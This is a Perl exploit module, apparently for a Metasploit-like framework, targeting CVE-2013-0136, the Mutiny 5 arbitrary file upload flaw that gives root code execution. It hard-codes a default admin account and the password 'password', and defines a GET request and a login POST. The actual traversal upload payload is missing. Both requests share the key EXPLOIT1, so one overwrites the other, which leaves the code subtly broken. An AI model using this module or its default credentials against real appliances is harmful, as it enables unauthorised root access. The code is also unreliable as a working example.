package MUTINY::MSF::MutinyFrontendUpload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "MutinyFrontendUpload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE" => "CVE-2013-0136",
  "DESCRIPTION" => "

          This module exploits a code execution flaw in the Mutiny 5 appliance. The

        EditDocument servlet provides a file upload function to authenticated users. A

        directory traversal vulnerability in the same functionality allows for arbitrary

        file upload, which results in arbitrary code execution with root privileges. In

        order to exploit the vulnerability a valid user (any role) in the web frontend is

        required. The module has been tested successfully on the Mutiny 5.0-1.07 appliance.

      ",
  "METHOD" => "GET",
  "MSF_MODULE" => "mutiny_frontend_upload",
  "OSVDB" => 93444,
  "PATHS" => [""],
  "REFERENCES" => [
    "https://community.rapid7.com/community/metasploit/blog/2013/05/15/new-1day-exploits-mutiny-vulnerabilities",
  ],
  "THE USER TO AUTHENTICATE AS" => "superadmin\@mutiny.com",
  "TITLE" => "Mutiny 5 Arbitrary File Upload",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Path to Mutiny Web Service", VALUE => "/" },
    'PASSWORD' =>       {
  DESCRIPTION => "The password to authenticate with",
  VALUE => "password",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'interface/j_security_check',
      PAYLOAD      => 'j_username=__USERNAME__&j_password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /interface/j_security_check',
      HEADERS      => {
        'Cookie' => 'JSESSIONID=',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
